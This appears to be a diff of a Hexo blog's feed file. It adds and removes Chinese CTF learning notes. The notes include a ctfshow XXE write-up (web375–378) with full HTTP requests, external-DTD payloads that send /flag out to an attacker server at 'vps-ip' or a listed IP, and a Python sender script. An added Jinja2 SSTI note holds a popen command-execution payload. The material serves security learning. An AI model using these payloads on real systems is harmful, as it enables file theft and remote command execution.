-<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (in.hasNext())&#123;</span><br><span class="line">            <span class="type">double</span> k=in.nextDouble();</span><br><span class="line">            <span class="keyword">if</span> (k&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">double</span> m=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (m*m&lt;k&amp;&amp;Math.abs(k-m*m)&gt;<span class="number">0.0001</span>) &#123;</span><br><span class="line">                    m+=<span class="number">0.0001</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.printf(<span class="string">&quot;%.6f\n&quot;</span>,m);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (k==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.printf(<span class="string">&quot;%.6f\n&quot;</span>,<span class="number">0.0</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;NaN\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Ping命令学习记录</title>
     <url>/2024/03/09/Ping%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h1><h2 id="题目样式"><a href="#题目样式" class="headerlink" title="题目样式"></a>题目样式</h2><p>看到ping或者ping命令却没有waf时就要想到命令注入。</p>
@@ -2038,113 +1943,6 @@
       <tags>
         <tag>命令执行</tag>
         <tag>Ping</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfshow XXE 刷题记录</title>
-    <url>/2024/04/02/ctfshow%20XEE%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="web373-web374"><a href="#web373-web374" class="headerlink" title="web373-web374"></a>web373-web374</h1><p>传送门：</p>
-<p><a href="https://ed3n.top/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/">XXE学习记录 | Ed3n’s Blog</a></p>
-<h1 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h1><p>先看源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
-
-<p>与上题的区别是多了如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> </p>
-<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>不要不就好了？web374 的做法也没有加 <code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>。那就和 web374 做法一致就行</p>
-<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后加个换行符，发包内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml </span><br><span class="line"> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>成功接收到 flag</p>
-<p><img src="https://s2.loli.net/2024/03/27/6jUB9ZCleKzR1FH.png" alt="image-20240327172210794"></p>
-<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后再加个空格，发包内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>成功接收到 flag</p>
-<p><img src="https://s2.loli.net/2024/03/27/Lb2ykmlj4vscCDg.png" alt="image-20240327173015025"></p>
-<h1 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h1><p>先看源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
-
-<p>与上题的区别是多了如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 及其大小写。emmmm… web375 的绕过方法好像也没有大小写绕过啊？</p>
-<p>那就直接用 web375 的方法好了</p>
-<h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><p>先看源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
-
-<p>与上题的区别是多了如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 和 <code>http</code> 及其大小写</p>
-<p>我们先看一下原 payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://81.71.4.233:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>有一个 <code>encoding=&quot;UTF-8&quot;</code> 的参数，那么我们就可以考虑除了 UTF-8 以外的其他编码，可以从 <a href="https://www.runoob.com/xml/xml-encoding.html">XML 编码 | 菜鸟教程 (runoob.com)</a> 中查看。</p>
-<p>那我们取其中一个试试看：</p>
-<p>先写一个编码转换的脚本（转 Unicode）：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utf8_str = <span class="built_in">input</span>(<span class="string">&quot;utf-8:&quot;</span>)</span><br><span class="line"></span><br><span class="line">unicode_str = utf8_str.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Unicode:&quot;</span>, unicode_str)</span><br></pre></td></tr></table></figure>
-
-<p>编码后为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\xff\xfe&lt;\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00&quot;\x001\x00.\x000\x00&quot;\x00 \x00e\x00n\x00c\x00o\x00d\x00i\x00n\x00g\x00=\x00&quot;\x00U\x00T\x00F\x00-\x008\x00&quot;\x00?\x00&gt;\x00\n\x00\n\x00&lt;\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00t\x00e\x00s\x00t\x00 \x00[\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00f\x00i\x00l\x00e\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00p\x00h\x00p\x00:\x00/\x00/\x00f\x00i\x00l\x00t\x00e\x00r\x00/\x00r\x00e\x00a\x00d\x00=\x00c\x00o\x00n\x00v\x00e\x00r\x00t\x00.\x00b\x00a\x00s\x00e\x006\x004\x00-\x00e\x00n\x00c\x00o\x00d\x00e\x00/\x00r\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00=\x00/\x00f\x00l\x00a\x00g\x00&quot;\x00&gt;\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00d\x00t\x00d\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00v\x00p\x00s\x00-\x00i\x00p\x00:\x008\x000\x000\x000\x00/\x00X\x00X\x00E\x00.\x00d\x00t\x00d\x00&quot;\x00&gt;\x00\n\x00%\x00d\x00t\x00d\x00;\x00\n\x00]\x00&gt;\x00\n\x00&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>但是直接放 Burp 里传不知道为什么成功不了</p>
-<p>试了 python 爬虫倒是成功了：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://819c130f-b2e1-4626-b9f8-8326d5ececbc.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2024/04/02/VPGSAM5s4NgQUeb.png" alt="image-20240402200146457"></p>
-<h1 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h1><p>f12 发现可疑代码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;doLogin&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: data,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">        	&#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;); </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段代码是一个 JavaScript 函数，名为<code>doLogin()</code>，它执行用户登录的操作。具体功能如下：</p>
-<ol>
-<li><p>获取用户输入的用户名和密码：</p>
-<ul>
-<li>通过<code>$(&quot;#username&quot;).val()</code>获取用户名输入框的值，存储在变量<code>username</code>中。</li>
-<li>通过<code>$(&quot;#password&quot;).val()</code>获取密码输入框的值，存储在变量<code>password</code>中。</li>
-</ul>
-</li>
-<li><p>检查用户名和密码是否为空：</p>
-<ul>
-<li>如果用户名或密码为空，则弹出警告框提示用户输入用户名和密码，并返回，不继续执行登录操作。</li>
-</ul>
-</li>
-<li><p>构建XML格式的数据：</p>
-<ul>
-<li>使用用户输入的用户名和密码构建一个XML格式的字符串，如<code>&lt;user&gt;&lt;username&gt;user123&lt;/username&gt;&lt;password&gt;pass123&lt;/password&gt;&lt;/user&gt;</code>，存储在变量<code>data</code>中。</li>
-</ul>
-</li>
-<li><p>发送Ajax请求：</p>
-<ul>
-<li>使用<code>$.ajax()</code>方法发送 POST 请求到 URL 为 “doLogin”。</li>
-<li>设置请求头的内容类型为 XML ，编码为 UTF-8 。</li>
-<li>发送构建好的 XML 数据。</li>
-<li>期望响应的数据类型为 XML 。</li>
-<li>设置<code>anysc</code>为 false ，表示同步请求。</li>
-<li>定义请求成功的回调函数和请求失败的回调函数。</li>
-</ul>
-</li>
-<li><p>处理响应：</p>
-<ul>
-<li>如果请求成功，从响应中提取<code>code</code>和<code>msg</code>，根据<code>code</code>的值显示不同的消息在页面上。</li>
-<li>如果请求失败，显示错误消息在页面上。</li>
-</ul>
-</li>
-</ol>
-<p>显然又是 XXE，输入 admin&#x2F;admin 后看他发送的包更加明了一些：</p>
-<p><img src="https://s2.loli.net/2024/04/02/iFLAJzIahG9Olf5.png" alt="image-20240402201520838"></p>
-<p>payload 反而比前面几道简单：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">XEE</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2024/04/02/OwET1C2ky7celi6.png" alt="image-20240402201914912"></p>
-]]></content>
-      <categories>
-        <category>XXE</category>
-      </categories>
-      <tags>
-        <tag>XXE</tag>
-        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -2388,6 +2186,208 @@
 <p><a href="https://zhuanlan.zhihu.com/p/389550468">XXE知识总结，有这篇就够了！ - 知乎 (zhihu.com)</a></p>
 <p><a href="https://blog.csdn.net/Jayjay___/article/details/132146130">Ctfshow web入门 XXE 模板注入篇 web373-web378 详细题解 全_ctfshow web373-CSDN博客</a></p>
 <p><a href="https://blog.csdn.net/uuzeray/article/details/134641792">【Web】CTFSHOW XXE刷题记录(全)-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>XXE</category>
+      </categories>
+      <tags>
+        <tag>XXE</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Flask Jinja2 SSTI学习记录</title>
+    <url>/2024/03/09/Jinja2%20SSTI/</url>
+    <content><![CDATA[<h1 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask Jinja2"></a>Flask Jinja2</h1><p>flask是使用Jinja2来作为渲染引擎的，模板文件并不是单纯的html代码，而是夹杂着模板的语法，因</p>
+<p>为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
+<p>flask的渲染方法有render_template和render_template_string两种。</p>
+<p>感觉…没什么好多说的，就是记模板</p>
+<span id="more"></span>
+
+<h2 id="模板和过滤（前提：以GET给name传参）"><a href="#模板和过滤（前提：以GET给name传参）" class="headerlink" title="模板和过滤（前提：以GET给name传参）"></a>模板和过滤（前提：以GET给name传参）</h2><h3 id="通用（并不是每一个题目都有以下几类）"><a href="#通用（并不是每一个题目都有以下几类）" class="headerlink" title="通用（并不是每一个题目都有以下几类）"></a>通用（并不是每一个题目都有以下几类）</h3><h4 id=""><a href="#" class="headerlink" title="&lt;class os.wrap_close&gt;"></a><code>&lt;class os.wrap_close&gt;</code></h4><h5 id="popen"><a href="#popen" class="headerlink" title="popen"></a><code>popen</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>讲述一些小细节：</p>
+<ul>
+<li><p><code>__bases__</code>后面的数字是根据实际情况，以<strong>object</strong>类出现的位数而定的（一般是<code>__bases__</code>为0，<code>__mro__</code>为1）</p>
+</li>
+<li><p><code>__subclasses__</code>后面的数字是根据实际情况，以<strong>os.wrap_close</strong>出现的位数而定的</p>
+</li>
+</ul>
